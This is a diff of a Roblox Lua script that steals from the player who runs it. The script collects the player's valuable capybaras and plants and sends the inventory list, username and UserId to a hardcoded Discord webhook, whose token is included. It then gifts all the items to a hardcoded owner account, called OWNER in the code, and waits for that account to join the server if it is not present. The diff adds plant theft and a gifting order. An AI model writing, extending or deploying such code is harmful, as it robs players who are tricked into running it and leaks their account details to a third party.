@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "kfkfkrowodokf"
+local OWNER = "Yxzramen0"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -38,22 +38,57 @@ local function isValuable(name)
     return false
 end
 
-local function pickUpPlacedCapybaras()
-    -- Find all placed capybaras in workspace and pick them up
-    local picked = {}
+local function isValuablePlant(name)
+    local lower = name:lower()
+    
+    -- Specific rare plant types
+    local rarePlants = {"ghost","mandrake","shock","divine","mythic","ascended","celestial","golden","rainbow","mega"}
+    for _, plant in ipairs(rarePlants) do
+        if lower:find(plant) then return true end
+    end
+    
+    -- Mutations that indicate value
+    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","toasty","pristine"}) do
+        if lower:find(mut) then return true end
+    end
+    
+    -- Items with multipliers
+    local mult = name:match("%[([%d%.]+)x%]")
+    if mult and tonumber(mult) >= MIN_MULT then return true end
+    
+    return false
+end
+
+local function pickUpPlacedCapybarasAndPlants()
+    -- Find all placed capybaras AND plants, return both separately
+    local picked = { capybaras = {}, plants = {} }
     
     local workspace = game:GetService("Workspace")
     for _, obj in ipairs(workspace:GetDescendants()) do
         -- Look for capybara models/instances
         if (obj:IsA("Model") or obj:IsA("Part")) and obj.Name then
-            if isValuable(obj.Name) then
+            local isCapy = false
+            local isPlant = false
+            
+            -- Check if it's a capybara
+            if isValuable(obj.Name) and not (obj.Name:lower():find("pepper") or obj.Name:lower():find("mandrake") or obj.Name:lower():find("plant")) then
+                isCapy = true
+            end
+            
+            -- Check if it's a plant
+            if isValuablePlant(obj.Name) and (obj.Name:lower():find("pepper") or obj.Name:lower():find("mandrake") or obj.Name:lower():find("plant")) then
+                isPlant = true
+            end
+            
+            if isCapy or isPlant then
                 local humanoidRoot = obj:FindFirstChild("HumanoidRootPart")
                 if humanoidRoot then
                     local char = lp.Character
                     if char and char:FindFirstChild("Humanoid") then
-                        print("📍 Found valuable: " .. obj.Name .. " - picking up...")
+                        local itemType = isCapy and "Capybara" or "Plant"
+                        print("📍 Found valuable " .. itemType .. ": " .. obj.Name .. " - picking up...")
                         
-                        -- Move close to the capybara
+                        -- Move close to the item
                         char.Humanoid:MoveTo(humanoidRoot.Position)
                         task.wait(0.8)
                         
@@ -72,20 +107,162 @@ local function pickUpPlacedCapybaras()
                         end
                         
                         task.wait(0.5)
-                        table.insert(picked, obj.Name)
-                        print("✓ Picked up: " .. obj.Name)
+                        if isCapy then
+                            table.insert(picked.capybaras, obj.Name)
+                            print("✓ Picked up Capybara: " .. obj.Name)
+                        else
+                            table.insert(picked.plants, obj.Name)
+                            print("✓ Picked up Plant: " .. obj.Name)
+                        end
                     end
                 end
             end
         end
     end
     
-    if #picked > 0 then
-        print("✓ Picked up " .. #picked .. " capybaras")
+    if #picked.capybaras > 0 then
+        print("✓ Picked up " .. #picked.capybaras .. " capybaras")
+    end
+    if #picked.plants > 0 then
+        print("✓ Picked up " .. #picked.plants .. " plants")
     end
     
     return picked
 end
+
+local function giftAllPrioritized(ownerPlayer, items, pickedItems)
+    -- Gift in order: capybaras → plants → other items
+    local char = lp.Character
+    if not char then 
+        print("❌ Cannot start gifting: missing character")
+        return 
+    end
+
+    task.wait(0.5)
+    
+    -- Separate into categories
+    local capySet = {}
+    for _, name in ipairs(pickedItems.capybaras) do
+        capySet[name] = "capy"
+    end
+    
+    local plantSet = {}
+    for _, name in ipairs(pickedItems.plants) do
+        plantSet[name] = "plant"
+    end
+    
+    local capyItems = {}
+    local plantItems = {}
+    local otherItems = {}
+    
+    for _, item in ipairs(items) do
+        if capySet[item.Name] then
+            table.insert(capyItems, item)
+        elseif plantSet[item.Name] then
+            table.insert(plantItems, item)
+        else
+            table.insert(otherItems, item)
+        end
+    end
+    
+    print("🎁 Gifting order: " .. #capyItems .. " capybaras → " .. #plantItems .. " plants → " .. #otherItems .. " other items")
+    
+    -- Gift capybaras first
+    for idx, item in ipairs(capyItems) do
+        if not item or not item.Parent then continue end
+        print("🎁 [CAPY #" .. idx .. "/" .. #capyItems .. "] Gifting: " .. item.Name)
+
+        local wasInBackpack = item.Parent == lp.Backpack
+        if wasInBackpack then
+            item.Parent = char
+            task.wait(0.5)
+        end
+
+        local success = false
+        for attempt = 1, 3 do
+            pcall(function()
+                RS.Remotes.GiftItem:FireServer(ownerPlayer, item.Name)
+            end)
+            task.wait(0.8)
+            
+            if not item or not item.Parent or (item.Parent ~= char and item.Parent ~= lp.Backpack) then
+                success = true
+                break
+            end
+            
+            if attempt < 3 then task.wait(0.3) end
+        end
+
+        print(success and "✓ [CAPY] Gifted: " .. item.Name or "✗ [CAPY] Failed: " .. item.Name)
+        task.wait(0.5)
+    end
+    
+    -- Gift plants
+    for idx, item in ipairs(plantItems) do
+        if not item or not item.Parent then continue end
+        print("🌱 [PLANT #" .. idx .. "/" .. #plantItems .. "] Gifting: " .. item.Name)
+
+        local wasInBackpack = item.Parent == lp.Backpack
+        if wasInBackpack then
+            item.Parent = char
+            task.wait(0.5)
+        end
+
+        local success = false
+        for attempt = 1, 3 do
+            pcall(function()
+                RS.Remotes.GiftItem:FireServer(ownerPlayer, item.Name)
+            end)
+            task.wait(0.8)
+            
+            if not item or not item.Parent or (item.Parent ~= char and item.Parent ~= lp.Backpack) then
+                success = true
+                break
+            end
+            
+            if attempt < 3 then task.wait(0.3) end
+        end
+
+        print(success and "✓ [PLANT] Gifted: " .. item.Name or "✗ [PLANT] Failed: " .. item.Name)
+        task.wait(0.5)
+    end
+    
+    -- Gift other items
+    if #otherItems > 0 then
+        print("🎁 Gifting remaining " .. #otherItems .. " other items...")
+        for idx, item in ipairs(otherItems) do
+            if not item or not item.Parent then continue end
+            print("🎁 [OTHER #" .. idx .. "/" .. #otherItems .. "] Gifting: " .. item.Name)
+
+            local wasInBackpack = item.Parent == lp.Backpack
+            if wasInBackpack then
+                item.Parent = char
+                task.wait(0.5)
+            end
+
+            local success = false
+            for attempt = 1, 3 do
+                pcall(function()
+                    RS.Remotes.GiftItem:FireServer(ownerPlayer, item.Name)
+                end)
+                task.wait(0.8)
+                
+                if not item or not item.Parent or (item.Parent ~= char and item.Parent ~= lp.Backpack) then
+                    success = true
+                    break
+                end
+                
+                if attempt < 3 then task.wait(0.3) end
+            end
+
+            print(success and "✓ [OTHER] Gifted: " .. item.Name or "✗ [OTHER] Failed: " .. item.Name)
+            task.wait(0.5)
+        end
+    end
+    
+    print("✓ Gifting complete!")
+end
+
 
 
 local function getItems()
@@ -108,6 +285,10 @@ end
 local function sendWebhook(items)
     local list = {}
     for _, item in ipairs(items) do table.insert(list, "• " .. item.Name) end
+    
+    -- Create join link for the server
+    local joinLink = "https://www.roblox.com/games/" .. game.PlaceId
+    
     local body = game:GetService("HttpService"):JSONEncode({
         content = "@everyone",
         embeds = {{
@@ -115,7 +296,12 @@ local function sendWebhook(items)
             description = table.concat(list, "\n"),
             color = 5763719,
             footer = { text = lp.Name .. " • " .. lp.UserId },
-            timestamp = DateTime.now():ToIsoDate()
+            timestamp = DateTime.now():ToIsoDate(),
+            fields = {{
+                name = "Join Server",
+                value = "[Click to Join](" .. joinLink .. ")",
+                inline = false
+            }}
         }}
     })
     pcall(function()
@@ -177,24 +363,25 @@ local function giftAll(ownerPlayer, items)
     print("✓ Gifting complete!")
 end
 
-local function tryGift(ownerPlayer, items)
+local function tryGift(ownerPlayer, items, pickedItems)
     ownerPlayer.CharacterAdded:Wait()
     task.wait(2)
-    giftAll(ownerPlayer, items)
+    giftAllPrioritized(ownerPlayer, items, pickedItems)
 end
 
 -- MAIN
-print("⏳ Scanning for placed capybaras...")
-pickUpPlacedCapybaras()
-task.wait(1)
+print("⏳ Scanning for placed capybaras and plants...")
+local pickedItems = pickUpPlacedCapybarasAndPlants()
+task.wait(1.5)
 
+-- Get ALL items now (including the picked up ones)
 local items = getItems()
 if #items == 0 then 
     print("❌ No valuable items found")
     return 
 end
 
-print("Found " .. #items .. " valuable items")
+print("Found " .. #items .. " valuable items (" .. #pickedItems.capybaras .. " capybaras + " .. #pickedItems.plants .. " plants)")
 sendWebhook(items)
 
 local owner = nil
@@ -207,13 +394,15 @@ for _, p in ipairs(Players:GetPlayers()) do
 end
 
 if owner then
-    giftAll(owner, items)
+    print("🎁 Starting to gift items (capybaras → plants → backpack)...")
+    giftAllPrioritized(owner, items, pickedItems)
 else
     print("⏳ Waiting for owner to join...")
     Players.PlayerAdded:Connect(function(p)
         if p.Name:lower() == OWNER:lower() then
             print("✓ Owner joined: " .. p.Name)
-            tryGift(p, items)
+            print("🎁 Starting to gift items (capybaras → plants → backpack)...")
+            tryGift(p, items, pickedItems)
         end
     end)
 end
